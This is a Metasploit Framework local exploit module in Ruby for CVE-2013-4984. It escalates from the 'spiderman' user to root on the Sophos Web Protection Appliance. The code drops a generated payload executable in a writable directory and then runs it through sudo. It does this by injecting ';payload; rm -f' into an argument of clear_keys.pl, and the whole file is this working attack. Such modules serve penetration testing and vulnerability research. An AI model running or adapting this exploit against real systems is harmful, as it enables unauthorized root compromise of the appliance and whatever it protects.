# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
require &#039;msf/core/post/linux/priv&#039;
require &#039;msf/core/exploit/exe&#039;


class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
      &#039;Name&#039;          => &#039;Sophos Web Protection Appliance clear_keys.pl Local Privilege Escalation&#039;,
      &#039;Description&#039;   => %q{
        This module abuses a command injection on the clear_keys.pl perl script, installed with the
        Sophos Web Protection Appliance, to escalate privileges from the "spiderman" user to "root".
        This module is useful for post exploitation of vulnerabilities on the Sophos Web Protection
        Appliance web ui, executed by the "spiderman" user. This module has been tested successfully
        on Sophos Virtual Web Appliance 3.7.0.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Francisco Falcon&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;Platform&#039;       => [ &#039;linux&#039;],
      &#039;Arch&#039;           => [ ARCH_X86 ],
      &#039;Targets&#039;        =>[[ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ]],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-4984&#039; ],
          [ &#039;OSVDB&#039;, &#039;97028&#039; ],
          [ &#039;BID&#039;, &#039;62265&#039; ],
          [ &#039;URL&#039;, &#039;http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          "PrependFork"      => true,
          "PrependSetresuid" => true,
          "PrependSetresgid" => true
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 06 2013&#039;
      }
    ))

    register_options([
        # These are not OptPath becuase it&#039;s a *remote* path
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
        OptString.new("clear_keys",  [ true, "Path to the clear_keys.pl vulnerable script", "/opt/cma/bin/clear_keys.pl" ]),
      ], self.class)
  end

  def check
    if file?(datastore["clear_keys"])
      return CheckCode::Detected
    end

    return CheckCode::Unknown
  end

  def exploit
    print_status("Checking actual user...")
    id = cmd_exec("id -un")
    if id != "spiderman"
      fail_with(Failure::NoAccess, "The actual user is \"#{id}\", you must be \"spiderman\" to exploit this")
    end

    print_status("Checking for the vulnerable component...")
    if check != CheckCode::Detected
      fail_with(Failure::NoTarget, "The vulnerable component has not been found")
    end

    print_status("Dropping the payload to #{datastore["WritableDir"]}")
    exe_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.elf"
    write_file(exe_file, generate_payload_exe)

    cmd_exec "chmod +x #{exe_file}"

    print_status("Running...")
    begin
      # rm the file after executing it to avoid getting multiple sessions
      cmd_exec "sudo #{datastore["clear_keys"]} #{rand_text_alpha(4 + rand(4))} \";#{exe_file}; rm -f #{exe_file};\" /#{rand_text_alpha(4 + rand(4))}"
    ensure
      cmd_exec "rm -f #{exe_file}"
    end
  end
end

